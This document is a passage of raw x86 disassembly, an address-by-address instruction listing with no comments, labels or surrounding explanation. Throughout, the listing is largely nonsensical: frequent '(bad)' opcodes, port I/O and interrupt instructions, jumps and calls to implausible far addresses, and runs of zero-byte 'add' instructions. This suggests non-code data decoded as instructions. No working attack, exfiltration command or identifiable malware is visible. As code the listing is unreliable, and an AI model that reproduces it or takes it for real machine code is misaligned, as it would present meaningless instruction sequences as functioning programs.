  43cb16:	out    0x3,eax
  43cb18:	push   eax
  43cb19:	loop   0x43cb80
  43cb1b:	ret    
  43cb1c:	jbe    0x43caff
  43cb1e:	xchg   esi,eax
  43cb1f:	(bad)  
  43cb20:	cmp    eax,0xb7f20648
  43cb25:	and    al,0x67
  43cb27:	jo     0x43cabc
  43cb29:	adc    DWORD PTR [edx+ecx*1],ebx
  43cb2c:	sbb    eax,0x1df2a024
  43cb31:	(bad)  
  43cb32:	pop    ebp
  43cb33:	dec    eax
  43cb34:	js     0x43cb47
  43cb36:	push   ecx
  43cb37:	sti    
  43cb38:	inc    DWORD PTR [esi+0x27d0370]
  43cb3e:	out    0x6,eax
  43cb40:	add    BYTE PTR [eax],al
  43cb42:	add    BYTE PTR [eax],al
  43cb44:	add    BYTE PTR [ebp-0x7b],dh
  43cb47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cb48:	pop    es
  43cb49:	cld    
  43cb4a:	mov    dl,0xa5
  43cb4c:	repnz aaa 
  43cb4e:	and    eax,0x828b4861
  43cb53:	(bad)  ds:0xdbe9576c
  43cb59:	loopne 0x43cb35
  43cb5b:	dec    ecx
  43cb5c:	repnz adc DWORD PTR [esi-0x6783d955],ecx
  43cb63:	out    dx,al
  43cb64:	xor    dh,0x90
  43cb67:	(bad)  
  43cb68:	call   0xeb3cad27
  43cb6d:	jbe    0x43cbce
  43cb6f:	shr    ch,0xa7
  43cb72:	sar    DWORD PTR [esi+eiz*1-0x170007d3],1
  43cb79:	jbe    0x43cb7d
  43cb7b:	test   DWORD PTR [ebx+ebx*2+0x71a9b20b],esp
  43cb82:	sbb    eax,0x276e9b9
  43cb87:	jns    0x43cb61
  43cb89:	sahf   
  43cb8a:	or     eax,0x5e64eef2
  43cb8f:	jnp    0x43cb90
  43cb91:	jge    0x43cbef
  43cb93:	add    dl,cl
  43cb95:	and    al,0xd9
  43cb97:	clc    
  43cb98:	(bad)  
  43cb99:	xor    cl,ch
  43cb9b:	lods   eax,DWORD PTR ds:[esi]
  43cb9c:	aam    0x44
  43cb9e:	fiadd  DWORD PTR [esp+ebp*1+0xa43e17b]
  43cba5:	clc    
  43cba6:	inc    ebx
  43cba7:	sbb    eax,0xeb
  43cbac:	add    BYTE PTR [eax],al
  43cbae:	xor    edx,eax
  43cbb0:	inc    edx
  43cbb1:	shl    DWORD PTR [esi+0x2],cl
  43cbb4:	add    cl,ch
  43cbb6:	test   eax,0xdcee1d44
  43cbbb:	and    bh,bh
  43cbbd:	shl    ebp,cl
  43cbbf:	loopne 0x43cbb9
  43cbc1:	jmp    0xa02bbf4b
  43cbc6:	add    bl,dl
  43cbc8:	clc    
  43cbc9:	push   0xffffff92
  43cbcb:	hlt    
  43cbcc:	(bad)  
  43cbcd:	sti    
  43cbce:	lahf   
  43cbcf:	pop    edi
  43cbd0:	jnp    0x43cba9
  43cbd2:	jge    0x43cc30
  43cbd4:	pop    ebp
  43cbd5:	push   ecx
  43cbd6:	lock fdivr st,st(0)
  43cbd9:	pop    esi
  43cbda:	mov    eax,0x76e9c01b
  43cbdf:	add    bh,BYTE PTR [edi+esi*4+0x4f]
  43cbe3:	lahf   
  43cbe4:	mov    esi,0x810a2600
  43cbe9:	ror    DWORD PTR [edi-0x1b],0x7
  43cbed:	add    DWORD PTR [esi+0x1f0b6de1],0xffffffed
  43cbf4:	clc    
  43cbf5:	jae    0x43cbd5
  43cbf7:	mov    esp,0xd383f85a
  43cbfc:	mov    ebx,0x6d048683
  43cc01:	aaa    
  43cc02:	pop    ds
  43cc03:	in     eax,dx
  43cc04:	cli    
  43cc05:	je     0x43cba1
  43cc07:	mov    esp,0xd183f84a
  43cc0c:	mov    ebx,0x6d058583
  43cc11:	push   es
  43cc12:	add    BYTE PTR [eax],al
  43cc14:	add    BYTE PTR [eax],al
  43cc16:	add    BYTE PTR [ecx+ecx*2-0x8],dh
  43cc1a:	call   DWORD PTR [ebx-0x39]
  43cc1d:	jnp    0x43cc18
  43cc1f:	pop    edx
  43cc20:	pop    ecx
  43cc21:	(bad)  
  43cc22:	out    0x80,eax
  43cc24:	out    dx,al
  43cc25:	idiv   edi
  43cc27:	pop    ds
  43cc28:	xchg   ecx,esi
  43cc2a:	pop    es
  43cc2b:	mov    DWORD PTR [eax+ebp*8],ecx
  43cc2e:	xor    DWORD PTR [ebx+edx*8],esi
  43cc31:	test   ebx,0x7507eccf
  43cc37:	sbb    bh,BYTE PTR [esi+ebx*1-0x442d2c08]
  43cc3e:	call   0x3ba3b8
  43cc43:	xchg   edi,eax
  43cc44:	dec    eax
  43cc45:	adc    al,BYTE PTR [ecx]
  43cc47:	pop    ecx
  43cc48:	and    eax,0x63f457b
  43cc4d:	mov    ebx,0x1059c7
  43cc52:	add    BYTE PTR [esp+eax*1],cl
  43cc55:	add    DWORD PTR [ebp-0x41],0x2
  43cc59:	scas   al,BYTE PTR es:[edi]
  43cc5a:	inc    eax
  43cc5b:	fnsave [eax]
  43cc5d:	mov    bh,0x0
  43cc5f:	int3   
  43cc60:	add    esi,DWORD PTR [edi+0x11]
  43cc63:	jne    0x43cca6
  43cc65:	sub    dh,bl
  43cc67:	rcl    BYTE PTR [eax-0x7c],cl
  43cc6a:	jp     0x43cccf
  43cc6c:	lock outs dx,BYTE PTR ds:[esi]
  43cc6e:	cs int 0x19
  43cc71:	clc    
  43cc72:	clc    
  43cc73:	mov    edx,0x75c02a2c
  43cc78:	jmp    0x444879
  43cc7d:	add    BYTE PTR [eax],al
  43cc7f:	add    BYTE PTR [eax+0x52],dl
  43cc82:	ret    
  43cc83:	mov    esi,0xbe75e58f
  43cc88:	test   BYTE PTR [edx],0x0
  43cc8b:	jge    0x43cc1c
  43cc8d:	mov    edi,0x2f60571
  43cc92:	div    BYTE PTR [ebx+0x64]
  43cc95:	icebp  
  43cc96:	mov    edi,0xbcd87af0
  43cc9b:	jl     0x43cd0c
  43cc9d:	shl    BYTE PTR [ecx+0x2],0x5d
  43cca1:	lods   eax,DWORD PTR ds:[esi]
  43cca2:	lock clc 
  43cca4:	bound  ebp,QWORD PTR [ebx+ebx*8-0x17479e50]
  43ccab:	test   BYTE PTR [eax-0x69bcfc2d],bh
  43ccb1:	ins    BYTE PTR es:[edi],dx
  43ccb2:	inc    edi
  43ccb3:	sbb    eax,0x42c0ac77
  43ccb8:	pop    edi
  43ccb9:	jmp    0x64b9ccba
  43ccbe:	inc    edi
  43ccbf:	sbb    eax,0xff443f7a
  43ccc4:	popa   
  43ccc5:	inc    eax
  43ccc6:	add    al,0x0
  43ccc8:	jne    0x43ccc2
  43ccca:	or     al,ch
  43cccc:	cs jne 0x43ccb7
  43cccf:	clc    
  43ccd0:	test   BYTE PTR ds:0xef890412,0x7d
  43ccd7:	jp     0x43cd3c
  43ccd9:	out    dx,eax
  43ccda:	jo     0x43cce4
  43ccdc:	imul   ch
  43ccde:	adc    al,BYTE PTR [ecx]
  43cce0:	push   0x2
  43cce2:	in     eax,0xda
  43cce4:	add    BYTE PTR [eax],al
  43cce6:	add    BYTE PTR [eax],al
  43cce8:	add    BYTE PTR [ebx-0x22089916],ah
  43ccee:	fisub  WORD PTR ds:0xe701b531
  43ccf4:	add    ecx,DWORD PTR [ecx+0x16]
  43ccf7:	jo     0x43ccbb
  43ccf9:	add    ebp,esp
  43ccfb:	loop   0x43cd79
  43ccfd:	sti    
  43ccfe:	add    BYTE PTR [edi-0x1],0x31
  43cd02:	(bad)  
  43cd04:	js     0x43cc8c
  43cd06:	sbb    DWORD PTR [edi],0xfffffffc
  43cd09:	pop    ds
  43cd0a:	and    ah,BYTE PTR [esi-0x13]
  43cd0d:	cdq    
  43cd0e:	push   edx
  43cd0f:	out    dx,al
  43cd10:	or     BYTE PTR [ebx-0x62ea6cfd],0x34
  43cd17:	cli    
  43cd18:	out    dx,al
  43cd19:	jge    0x43ccdd
  43cd1b:	gs jmp 0xb6b:0x82de556d
  43cd23:	imul   eax,DWORD PTR ds:0xeeda485d,0x5d
  43cd2a:	ret    0x2bce
  43cd2d:	popa   
  43cd2e:	(bad)  
  43cd30:	jp     0x43cce9
  43cd32:	clc    
  43cd33:	out    0x48,eax
  43cd35:	push   0x43232b81
  43cd3a:	shl    DWORD PTR [ecx-0x18fd9cb8],0x3
  43cd41:	jne    0x43cccc
  43cd43:	and    esp,DWORD PTR [ebx]
  43cd45:	jl     0x43ccdb
  43cd47:	es add eax,0x3e69d5e
  43cd4d:	add    BYTE PTR [eax],al
  43cd4f:	add    BYTE PTR [eax],al
  43cd51:	add    BYTE PTR [ebp+0x5d],dh
  43cd54:	clc    
  43cd55:	fld    TBYTE PTR [esi-0x7611762a]
  43cd5b:	pop    edi
  43cd5c:	fld    DWORD PTR [esi]
  43cd5e:	jg     0x43cd80
  43cd60:	(bad)  
  43cd61:	inc    BYTE PTR ds:0xb775ffde
  43cd67:	sbb    al,al
  43cd69:	jmp    0xfcbfcfe4
  43cd6e:	popa   
  43cd6f:	lahf   
  43cd70:	mov    esi,0xbe857253
  43cd75:	push   0xffffffd9
  43cd77:	or     bh,BYTE PTR [ebp+0x53]
  43cd7a:	jne    0x43cdcd
  43cd7c:	add    dl,BYTE PTR [ecx-0x39]
  43cd7f:	sar    eax,cl
  43cd81:	ds mov bh,0xe5
  43cd84:	loope  0x43cdc0
  43cd86:	mov    ds:0x7ca484da,eax
  43cd8b:	fld    QWORD PTR [ebx-0x36]
  43cd8e:	test   DWORD PTR [eax+0x1d],0x42c2b7eb
  43cd95:	repz jbe 0x43cd9a
  43cd98:	add    cl,ch
  43cd9a:	cmovo  ebx,DWORD PTR ds:0xff1dc8f6
  43cda1:	mov    ebx,0xe9f8ddcb
  43cda6:	jecxz  0x43cd9d
  43cda8:	out    0xe3,eax
  43cdaa:	(bad)  
  43cdab:	(bad)  
  43cdad:	push   0xffffffd2
  43cdaf:	lock add dl,BYTE PTR [ebp+0x59]
  43cdb3:	pop    esi
  43cdb4:	jnp    0x43cdb5
  43cdb6:	add    BYTE PTR [eax],al
  43cdb8:	add    BYTE PTR [eax],al
  43cdba:	add    BYTE PTR [ecx+0x5b],bh
  43cdbd:	inc    cl
  43cdbf:	xchg   edx,ebp
  43cdc1:	mov    dl,0xbf
  43cdc3:	push   eax
  43cdc4:	fidivr DWORD PTR [esp+edi*8-0x160722ca]
  43cdcb:	mov    ds:0x36ab8721,al
  43cdd0:	out    0x3,eax
  43cdd2:	jo     0x43ce0a
  43cdd4:	pop    esi
  43cdd5:	fucomip st,st(6)
  43cdd7:	cmc    
  43cdd8:	(bad)  
  43cdd9:	or     ebx,DWORD PTR [esp+ecx*1]
  43cddc:	pop    esi
  43cddd:	mul    ecx
  43cddf:	call   0xf7d4:0xa000e80d
  43cde6:	dec    edi
  43cde8:	xor    dl,0xf
  43cdeb:	icebp  
  43cdec:	push   es
  43cded:	call   0xf833307b
  43cdf2:	ret    
  43cdf3:	inc    esp
  43cdf4:	push   edx
  43cdf5:	jmp    0x43cdf6
  43cdf7:	cmp    ebx,DWORD PTR [ebx+0x3e]
  43cdfa:	sbb    bl,ch
  43cdfc:	inc    ebx
  43cdfd:	sbb    eax,DWORD PTR [ebx-0x3d05ddef]
  43ce03:	xchg   ebx,eax
  43ce04:	inc    ebp
  43ce05:	adc    al,BYTE PTR [eax]
  43ce07:	int3   
  43ce08:	add    BYTE PTR [eax],al
  43ce0a:	mov    esp,ecx
  43ce0c:	and    DWORD PTR [edi],eax
  43ce0e:	mov    dh,0xdc
  43ce10:	push   DWORD PTR [edi+edi*4]
  43ce13:	mov    WORD PTR [eax],es
  43ce15:	add    BYTE PTR [edi-0x63],bh
  43ce18:	mov    eax,0xef6bf398
  43ce1d:	jnp    0x43ce9c
  43ce1f:	add    BYTE PTR [eax],al
  43ce21:	add    BYTE PTR [eax],al
  43ce23:	add    BYTE PTR [edx+0x64277605],al
  43ce29:	xor    ebp,esi
  43ce2b:	(bad)  
  43ce2c:	jnp    0x43cdef
  43ce2e:	xor    eax,0x5cc0
  43ce33:	jl     0x43ce7b
  43ce35:	pop    ecx
  43ce36:	mov    ebx,0x810446c1
  43ce3b:	ror    edi,0xe0
  43ce3e:	pop    es
  43ce3f:	and    DWORD PTR [esi],0xffffffdd
  43ce42:	ins    DWORD PTR es:[edi],dx
  43ce43:	or     ebx,edi
  43ce45:	call   0xb896424b
  43ce4a:	sub    dh,dh
  43ce4c:	sti    
  43ce4d:	out    dx,al
  43ce4e:	mov    ebx,0xf7d181e8
  43ce53:	call   DWORD PTR [edi+0x51011244]
  43ce59:	and    DWORD PTR [ebx+0x45],edi
  43ce5c:	das    
  43ce5d:	add    bh,BYTE PTR [ebx+0x62e75c7]
  43ce63:	add    BYTE PTR [ebp-0x17],dh
  43ce66:	cld    
  43ce67:	test   BYTE PTR [eax-0x4a4e0438],bh
  43ce6d:	jmp    0x78fc:0xe975b929
  43ce74:	test   BYTE PTR [ecx+0x64e2ed35],al
  43ce7a:	cmp    BYTE PTR [edx-0x7d],0xe4
  43ce7e:	push   0x4e
  43ce80:	fnsave ds:0x28caf8f2
  43ce86:	sub    al,al
  43ce88:	add    BYTE PTR [eax],al
  43ce8a:	add    BYTE PTR [eax],al
  43ce8c:	add    BYTE PTR [ebp-0x17],dh
  43ce8f:	cld    
  43ce90:	jnp    0x43cec2
  43ce92:	push   edx
  43ce93:	mov    edi,0x75ed9fbe
  43ce98:	mov    esi,0x7cfc4af6
  43ce9d:	lahf   
  43ce9e:	aad    0x71
  43cea0:	add    cl,BYTE PTR [ebp-0x6d070df7]
  43cea6:	sub    BYTE PTR [eax+0x27678f5],al
  43ceac:	call   0xf928ad59
  43ceb1:	mov    dh,0x68
  43ceb3:	out    0x9,eax
  43ceb5:	call   0x763a4e73
  43ceba:	push   ebp
  43cebb:	or     BYTE PTR [ebp+0x5c],bh
  43cebe:	shl    DWORD PTR [edi+0x12],1
  43cec1:	dec    ebp
  43cec2:	test   eax,0xa852f8ee
  43cec7:	xor    ch,0x7a
  43ceca:	ss stc 
  43cecc:	jl     0x43cf0a
  43cece:	shl    DWORD PTR [eax+0x2],1
  43ced1:	dec    ebp
  43ced2:	pop    ecx
  43ced3:	out    dx,eax
  43ced4:	clc    
  43ced5:	xor    ch,BYTE PTR [eax-0x53d86325]
  43cedb:	in     al,0x84
  43cedd:	mov    eax,0xb604fd02
  43cee2:	pop    ds
  43cee3:	inc    cx
  43cee5:	jo     0x43cee7
  43cee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cee8:	mov    eax,0x920ece3e
  43ceed:	add    ebx,ebx
  43ceef:	out    0x3,al
  43cef1:	add    BYTE PTR [eax],al
  43cef3:	add    BYTE PTR [eax],al
  43cef5:	add    BYTE PTR [ebp+0x2],dh
  43cef8:	out    0x3,eax
  43cefa:	jne    0x43cefe
  43cefc:	and    DWORD PTR [ecx+0x1472dae9],0x75
  43cf03:	add    al,bl
  43cf05:	mov    ecx,ds
  43cf07:	(bad)  
  43cf09:	add    esi,DWORD PTR [ebp+0x2]
  43cf0c:	out    0x3,eax
  43cf0e:	jne    0x43cf12
  43cf10:	xchg   ebp,eax
  43cf11:	cwde   
  43cf12:	rcr    edx,0x1e
  43cf15:	pop    ss
  43cf16:	jne    0x43cf1a
  43cf18:	arpl   WORD PTR [ecx+0x3e6dab1],dx
  43cf1e:	jne    0x43cf22
  43cf20:	out    0x3,eax
  43cf22:	jne    0x43cf26
  43cf24:	inc    edi
  43cf25:	fwait
  43cf26:	cdq    
  43cf27:	(bad)  
  43cf29:	adc    esi,DWORD PTR [ebp+0x2]
  43cf2c:	or     ecx,DWORD PTR [ecx+ecx*4+0x7503e6da]
  43cf33:	add    ah,bh
  43cf35:	add    esi,DWORD PTR [ebp+0x2]
  43cf38:	fwait
  43cf39:	mov    ah,0x71
  43cf3b:	fiadd  DWORD PTR [esi+0x13027516]
  43cf41:	mov    WORD PTR [ecx-0x26],fs
  43cf44:	out    0x3,al
  43cf46:	jne    0x43cf4a
  43cf48:	out    0x3,eax
  43cf4a:	jne    0x43cf4e
  43cf4c:	test   DWORD PTR [ecx+ecx*2+0x751736da],esi
  43cf53:	add    bl,BYTE PTR [ebx]
  43cf55:	lea    edi,[ecx]
  43cf57:	(bad)  
  43cf59:	add    eax,DWORD PTR [eax]
  43cf5b:	add    BYTE PTR [eax],al
  43cf5d:	add    BYTE PTR [eax],al
  43cf5f:	jne    0x43cf63
  43cf61:	add    cl,ch
  43cf63:	jbe    0x43cf67
  43cf65:	add    BYTE PTR [ecx-0x46072917],ch
  43cf6b:	add    DWORD PTR [edx],0x0
  43cf6e:	in     eax,dx
  43cf6f:	cli    
  43cf70:	(bad)  
  43cf71:	clc    
  43cf72:	jmp    0xe943d1ed
  43cf77:	jbe    0x43cf7b
  43cf79:	add    BYTE PTR ds:0x71f8d6c3,al
  43cf7f:	test   BYTE PTR [edx],al
  43cf81:	add    BYTE PTR [ecx-0x160728fc],bh
  43cf87:	jbe    0x43cf8b
  43cf89:	add    cl,ch
  43cf8b:	jbe    0x43cf8f
  43cf8d:	add    ch,cl
  43cf8f:	or     edx,edi
  43cf91:	clc    
  43cf92:	test   DWORD PTR [esi+0x2],esp
  43cf95:	add    BYTE PTR [ecx-0x1607290d],bh
  43cf9b:	jbe    0x43cf9f
  43cf9d:	add    cl,ch
  43cf9f:	jbe    0x43cfa3
  43cfa1:	add    bh,bl
  43cfa3:	fcmovbe st,st(6)
  43cfa5:	clc    
  43cfa6:	sbb    eax,0xf5000285
  43cfab:	add    al,0xd7
  43cfad:	clc    
  43cfae:	jmp    0xe943d229
  43cfb3:	jbe    0x43cfb7
  43cfb5:	add    BYTE PTR [ebx],bl
  43cfb7:	rcl    dh,cl
  43cfb9:	clc    
  43cfba:	jno    0x43d022
  43cfbc:	add    al,BYTE PTR [eax]
  43cfbe:	cmc    
  43cfbf:	add    esi,edx
  43cfc1:	clc    
  43cfc2:	jmp    0x43cfc7
  43cfc7:	add    BYTE PTR [esi+0x2],dh
  43cfca:	add    cl,ch
  43cfcc:	jbe    0x43cfd0
  43cfce:	add    bl,bl
  43cfd0:	daa    
  43cfd1:	(bad)  
  43cfd2:	clc    
  43cfd3:	pop    ecx
  43cfd4:	add    BYTE PTR [edx],0x0
  43cfd7:	test   eax,0xe9f8d5f9
  43cfdc:	jbe    0x43cfe0
  43cfde:	add    BYTE PTR [eax],al
  43cfe0:	dec    esp
  43cfe1:	add    eax,0x93f20000
  43cfe6:	sti    
  43cfe7:	jmp    DWORD PTR [eax]
  43cfe9:	out    dx,al
  43cfea:	(bad)  
  43cfeb:	call   FWORD PTR [esi+eax*4+0x50cfffb]
  43cff2:	add    BYTE PTR [eax],al
  43cff4:	sbb    al,0x5
  43cff6:	add    BYTE PTR [eax],al
  43cff8:	pop    esp
  43cff9:	xchg   ebx,eax
  43cffa:	sti    
  43cffb:	inc    eax
  43cffd:	in     eax,dx
  43cffe:	(bad)  
  43cfff:	(bad)  
  43d000:	cld    
  43d001:	jb     0x43cffe
  43d003:	(bad)  
  43d004:	fadd   QWORD PTR [eax+eax*1]
  43d007:	add    ah,bl
  43d009:	add    al,0x0
  43d00b:	add    BYTE PTR [edx-0x6d],bh
  43d00e:	sti    
  43d00f:	inc    DWORD PTR [eax-0x12]
  43d012:	(bad)  
  43d013:	jmp    DWORD PTR [eax-0x23000479]
  43d019:	add    al,0x0
  43d01b:	add    ah,cl
  43d01d:	add    al,0x0
  43d01f:	add    al,cl
  43d021:	lods   al,BYTE PTR ds:[esi]
  43d022:	sti    
  43d023:	jmp    esp
  43d025:	repnz (bad) 
  43d027:	call   FWORD PTR [esp+eax*1+0x0]
  43d02e:	add    BYTE PTR [eax],al
  43d030:	add    BYTE PTR [esp+eax*1+0x48c0000],cl
  43d037:	add    BYTE PTR [eax],al
  43d039:	pushf  
  43d03a:	add    al,0x0
  43d03c:	add    BYTE PTR [esp+eax*1+0x7a760000],bl
  43d043:	sti    
  43d044:	push   DWORD PTR [edx]
  43d046:	jp     0x43d043
  43d048:	dec    DWORD PTR [edx+0x60fffb7a]
  43d04e:	jo     0x43d04b
  43d050:	inc    DWORD PTR [edx+0x71]
  43d053:	sti    
  43d054:	jmp    FWORD PTR [esi+0x6f]
  43d057:	sti    
  43d058:	inc    DWORD PTR [edx+0x75fffb6f]
  43d05e:	sub    DWORD PTR [ecx-0x6f07bd04],edx
  43d064:	cld    
  43d065:	cmp    al,BYTE PTR [esi-0x6f]
  43d068:	cld    
  43d069:	xor    bl,BYTE PTR [esi-0x6e]
  43d06c:	cld    
  43d06d:	sub    cl,BYTE PTR [edx+0x7222fc91]
  43d073:	xchg   ecx,eax
  43d074:	cld    
  43d075:	sbb    dh,BYTE PTR [esi-0x6f]
  43d078:	cld    
  43d079:	adc    bl,dl
  43d07b:	xchg   esi,eax
  43d07c:	cld    
  43d07d:	or     al,dh
  43d07f:	xchg   esi,eax
  43d080:	cld    
  43d081:	add    ch,BYTE PTR [esi+0x27fafc96]
  43d087:	xchg   esi,eax
  43d088:	cld    
  43d089:	repnz out dx,eax
  43d08b:	xchg   ebp,eax
  43d08c:	cld    
  43d08d:	jmp    0x9769:0xe2fc9603
  43d094:	cld    
  43d095:	add    BYTE PTR [eax],al
  43d097:	add    BYTE PTR [eax],al
  43d099:	add    dl,bl
  43d09b:	pop    ebx
  43d09c:	xchg   edi,eax
  43d09d:	cld    
  43d09e:	rol    BYTE PTR [ebp+0x25cafc96],cl
  43d0a4:	xchg   edi,eax
  43d0a5:	cld    
  43d0a6:	ret    0x9725
  43d0a9:	cld    
  43d0aa:	mov    edx,0xb2fc9715
  43d0af:	mov    ecx,0x5aafc97
  43d0b4:	xchg   edi,eax
  43d0b5:	cld    
  43d0b6:	mov    ds:0x9afc97e5,al
  43d0bb:	fwait
  43d0bc:	xchg   edi,eax
  43d0bd:	cld    
  43d0be:	xchg   edx,eax
  43d0bf:	jge    0x43d058
  43d0c1:	cld    
  43d0c2:	mov    dh,BYTE PTR [ebp-0x69]
  43d0c5:	cld    
  43d0c6:	sbb    BYTE PTR [edi-0x68],0xfc
  43d0ca:	jp     0x43d0b5
  43d0cc:	cld    
  43d0cd:	push   DWORD PTR [ebp+0x1d]
  43d0d0:	test   eax,0xa94b6afc
  43d0d5:	cld    
  43d0d6:	bound  ebx,QWORD PTR [ebp-0x57]
  43d0d9:	cld    
  43d0da:	pop    edx
  43d0db:	add    dl,BYTE PTR [ecx-0x50]
  43d0de:	push   ecx
  43d0df:	xlat   BYTE PTR ds:[ebx]
  43d0e0:	cmp    dh,BYTE PTR [eax-0x4fd528b7]
  43d0e6:	inc    ecx
  43d0e7:	xlat   BYTE PTR ds:[ebx]
  43d0e8:	add    al,0xb0
  43d0ea:	cmp    edi,edx
  43d0ec:	mov    ds:0xe6d731b0,al
  43d0f1:	add    esi,DWORD PTR [ebp+0x2]
  43d0f4:	sbb    DWORD PTR [ebx-0x4d6928df],esi
  43d0fa:	sbb    edi,edx
  43d0fc:	and    al,0xb3
  43d0fe:	add    BYTE PTR [eax],al
  43d100:	add    BYTE PTR [eax],al
  43d102:	add    BYTE PTR [ecx],dl
  43d104:	xlat   BYTE PTR ds:[ebx]
  43d105:	pop    edx
  43d106:	mov    dl,0x9
  43d108:	xlat   BYTE PTR ds:[ebx]
  43d109:	push   esi
  43d10a:	mov    dl,0x1
  43d10c:	xlat   BYTE PTR ds:[ebx]
  43d10d:	shl    BYTE PTR [edx-0x4d332907],1
  43d113:	icebp  
  43d114:	(bad)  
  43d115:	fidiv  DWORD PTR [edx-0x4d172917]
  43d11b:	loope  0x43d0f3
  43d11d:	push   0xffffffb2
  43d11f:	(bad)  
  43d121:	push   esi
  43d122:	mov    dl,0xd1
  43d124:	(bad)  
  43d125:	inc    esi
  43d126:	mov    dl,0xc9
  43d128:	(bad)  
  43d129:	xchg   BYTE PTR [edx-0x4d3b293f],dh
  43d12f:	mov    ecx,0xb1b268d6
  43d134:	(bad)  
  43d135:	out    0x3,al
  43d137:	jne    0x43d13b
  43d139:	mov    eax,ds:0xe6d6a1ae
  43d13e:	add    esi,DWORD PTR [ebp+0x2]
  43d141:	mov    ch,0xa4
  43d143:	xchg   ecx,eax
  43d144:	(bad)  
  43d145:	test   BYTE PTR [ecx+ecx*4-0x7e5b652a],ah
  43d14c:	(bad)  
  43d14d:	pop    eax
  43d14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d14f:	jns    0x43d127
  43d151:	dec    edx
  43d152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d153:	jno    0x43d12b
  43d155:	cmp    ah,BYTE PTR [ebp+0x20ffd669]
  43d15b:	sbb    bh,dl
  43d15d:	clc    
  43d15e:	std    
  43d15f:	adc    edi,edx
  43d161:	clc    
  43d162:	jmp    0xf03ca87b
  43d167:	add    BYTE PTR [eax],al
  43d169:	add    BYTE PTR [eax],al
  43d16b:	add    BYTE PTR [edi+edx*8],dl
  43d16e:	clc    
  43d16f:	(bad)  
  43d171:	xlat   BYTE PTR ds:[ebx]
  43d172:	clc    
  43d173:	(bad)  
  43d175:	xlat   BYTE PTR ds:[ebx]
  43d176:	clc    
  43d177:	and    edx,edi
  43d179:	(bad)  
  43d17a:	clc    
  43d17b:	inc    edi
  43d17c:	xlat   BYTE PTR ds:[ebx]
  43d17d:	(bad)  
  43d17e:	clc    
  43d17f:	cmp    edx,edi
  43d181:	(bad)  
  43d182:	clc    
  43d183:	imul   edx,esp,0xd477f8d6
  43d189:	(bad)  
  43d18a:	clc    
  43d18b:	jg     0x43d161
  43d18d:	(bad)  
  43d18e:	clc    
  43d18f:	push   ecx
  43d190:	aam    0xd6
  43d192:	clc    
  43d193:	lahf   
  43d194:	aam    0xd6
  43d196:	clc    
  43d197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d198:	adc    al,0xd7
  43d19a:	clc    
  43d19b:	(bad)  
  43d19c:	adc    al,0xd7
  43d19e:	clc    
  43d19f:	jmp    0xce3ca8bb
  43d1a4:	pop    ss
  43d1a5:	xlat   BYTE PTR ds:[ebx]
  43d1a6:	clc    
  43d1a7:	and    DWORD PTR [esi],edx
  43d1a9:	xlat   BYTE PTR ds:[ebx]
  43d1aa:	clc    
  43d1ab:	mov    ecx,0xc3f8d717
  43d1b0:	pop    ss
  43d1b1:	xlat   BYTE PTR ds:[ebx]
  43d1b2:	clc    
  43d1b3:	gs pop ss
  43d1b5:	xlat   BYTE PTR ds:[ebx]
  43d1b6:	clc    
  43d1b7:	pop    ebp
  43d1b8:	xlat   BYTE PTR ds:[ebx]
  43d1b9:	(bad)  
  43d1ba:	clc    
  43d1bb:	test   edi,edx
  43d1bd:	(bad)  
  43d1be:	clc    
  43d1bf:	jae    0x43d198
  43d1c1:	(bad)  
  43d1c2:	clc    
  43d1c3:	sbb    edx,edi
  43d1c5:	(bad)  
  43d1c6:	clc    
  43d1c7:	or     edi,edx
  43d1c9:	(bad)  
  43d1ca:	clc    
  43d1cb:	sbb    edi,edx
  43d1cd:	(bad)  
  43d1ce:	clc    
  43d1cf:	pop    ss
  43d1d0:	add    BYTE PTR [eax],al
  43d1d2:	add    BYTE PTR [eax],al
  43d1d4:	add    bh,dl
  43d1d6:	(bad)  
  43d1d7:	clc    
  43d1d8:	fstp   st(2)
  43d1da:	(bad)  
  43d1db:	clc    
  43d1dc:	add    BYTE PTR [esi*2-0x61d50005],bh
  43d1e3:	sti    
  43d1e4:	dec    DWORD PTR [eax+0xfffb7f]
  43d1ea:	jne    0x43d1e7
  43d1ec:	jmp    FWORD PTR [edx-0x2f00045e]
  43d1f2:	mov    ds:0xa2bcfffb,al
  43d1f7:	sti    
  43d1f8:	dec    edx
  43d1fa:	mov    ds:0xa2acfffb,al
  43d1ff:	sti    
  43d200:	call   eax
  43d202:	mov    eax,ds:0xa1fcfffb
  43d207:	sti    
  43d208:	jmp    FWORD PTR [edx+eiz*4]
  43d20b:	sti    
  43d20c:	(bad)  
  43d20d:	out    dx,al
  43d20e:	mov    eax,ds:0x7412fffb
  43d213:	sti    
  43d214:	inc    DWORD PTR [esi]
  43d216:	je     0x43d213
  43d218:	call   FWORD PTR [esi]
  43d21a:	je     0x43d217
  43d21c:	jmp    FWORD PTR [eax-0x7700048b]
  43d222:	jne    0x43d21f
  43d224:	push   DWORD PTR [ebp+esi*2-0x5]
  43d228:	(bad)  
  43d229:	fidiv  WORD PTR [ebx-0x5]
  43d22c:	call   FWORD PTR [ebp+esi*2-0x5]
  43d230:	dec    DWORD PTR [ebp+esi*2-0x5]
  43d234:	push   eax
  43d236:	je     0x43d233
  43d238:	inc    DWORD PTR [eax]
  43d23a:	add    BYTE PTR [eax],al
  43d23c:	add    BYTE PTR [eax],al
  43d23e:	loopne 0x43d2b4
  43d240:	sti    
  43d241:	jmp    DWORD PTR [ebp+esi*2-0x5]
  43d245:	inc    DWORD PTR [edx-0x1f00048b]
  43d24b:	test   al,0xfb
  43d24d:	inc    DWORD PTR [ecx+ebp*4]
  43d250:	sti    
  43d251:	jmp    eax
  43d253:	test   al,0xfb
  43d255:	call   DWORD PTR [eax+ebp*4-0x368a0005]
  43d25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d25d:	cld    
  43d25e:	jp     0x43d23a
  43d260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d261:	cld    
  43d262:	jb     0x43d244
  43d264:	popf   
  43d265:	cld    
  43d266:	push   0xffffffb0
  43d268:	popf   
  43d269:	cld    
  43d26a:	(bad)  
  43d26b:	fcomp  QWORD PTR [ebp-0x6319a504]
  43d271:	cld    
  43d272:	push   edx
  43d273:	(bad)  
  43d274:	pushf  
  43d275:	cld    
  43d276:	dec    edx
